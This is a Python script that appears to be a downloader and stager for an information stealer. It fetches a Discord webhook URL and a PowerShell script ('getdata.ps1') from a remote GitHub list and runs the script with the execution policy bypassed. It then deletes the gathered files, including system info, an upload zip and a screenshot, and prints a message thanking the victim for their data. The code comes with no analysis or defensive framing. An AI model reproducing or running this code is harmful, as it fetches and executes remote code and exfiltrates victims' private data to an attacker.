import sys
import subprocess
from pathlib import Path
import time
import os

def ensure_module(module_name, pip_name=None):
    try:
        __import__(module_name)
    except ImportError:
        print(f"📦 Missing '{module_name}', installing...")
        subprocess.check_call([
            sys.executable,
            "-m",
            "pip",
            "install",
            pip_name or module_name
        ])

ensure_module("aiohttp")

import asyncio
import aiohttp
import shutil

URL_SOURCE = "https://raw.githubusercontent.com/thompog/urls_for_projects/refs/heads/main/urls.txt"
BASE_DIR = Path(__file__).resolve().parent

DONE_TIMEOUT = 60
MAX_RETRIES = 3

async def fetch_text(session, url, retries=3):
    last_err = None

    for attempt in range(1, retries + 1):
        try:
            async with session.get(url, timeout=10) as r:
                if 200 <= r.status < 300:
                    return await r.text()
                last_err = f"HTTP {r.status}"
        except Exception as e:
            last_err = str(e)

        await asyncio.sleep(1 * attempt)

    raise RuntimeError(f"fuck i hate this shit")

def backup_file(path: Path):
    if path.exists():
        backup = path.with_suffix(path.suffix + ".bak")
        shutil.copy2(path, backup)
        return backup
    return None

def restore_file(backup: Path, target: Path):
    if backup and backup.exists():
        shutil.copy2(backup, target)

def run_powershell(script_path: Path):
    result = subprocess.run(
        ["powershell", "-ExecutionPolicy", "Bypass", "-File", str(script_path)],
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        raise RuntimeError(f"shit faild cess i be remakin that")

    return result

def wait_for_done(path: Path, timeout: int):
    start = time.time()

    while not path.exists():
        if time.time() - start > timeout:
            raise TimeoutError("well shii")
        time.sleep(1)

async def main():
    async with aiohttp.ClientSession() as session:

        print("gettin' stuff ready like modules")
        url_text = await fetch_text(session, URL_SOURCE, MAX_RETRIES)

        urls = [u.strip() for u in url_text.splitlines() if u.strip()]
        if len(urls) < 2:
            raise ValueError("FUUUUUUUUUUUUUUUUUUUU")

        webhook_url, script_url = urls[0], urls[1]


        webhook_task = fetch_text(session, webhook_url, MAX_RETRIES)
        script_task = fetch_text(session, script_url, MAX_RETRIES)

        webhook_text, script_text = await asyncio.gather(webhook_task, script_task)

        webhook_file = BASE_DIR / "discord_webhook.txt"
        ps1_file = BASE_DIR / "getdata.ps1"

        webhook_backup = backup_file(webhook_file)
        ps1_backup = backup_file(ps1_file)

        try:
            webhook_file.write_text(webhook_text, encoding="utf-8")
            ps1_file.write_text(script_text, encoding="utf-8")

            print("fuck i hate this shit")
            run_powershell(ps1_file)

            print("wow this is uh slow")
            wait_for_done(BASE_DIR / "done.txt", DONE_TIMEOUT)

            done_file = BASE_DIR / "done.txt"
            info_file = BASE_DIR / "info.txt"
            info_file_json = BASE_DIR / "info.json"
            info_upload = BASE_DIR / "info_upload.zip"
            screenshot = BASE_DIR / "screenshot.png"

            print("ah yes think you for your data")
            os.remove(done_file)
            os.remove(info_file)
            os.remove(info_file_json)
            os.remove(info_upload)
            os.remove(screenshot)

        except Exception as e:
            print(f"well piss theres an error")
            print("so uh what cha doin'?")

            restore_file(webhook_backup, webhook_file)
            restore_file(ps1_backup, ps1_file)

            print("idk am bord of making this")
            raise

asyncio.run(main())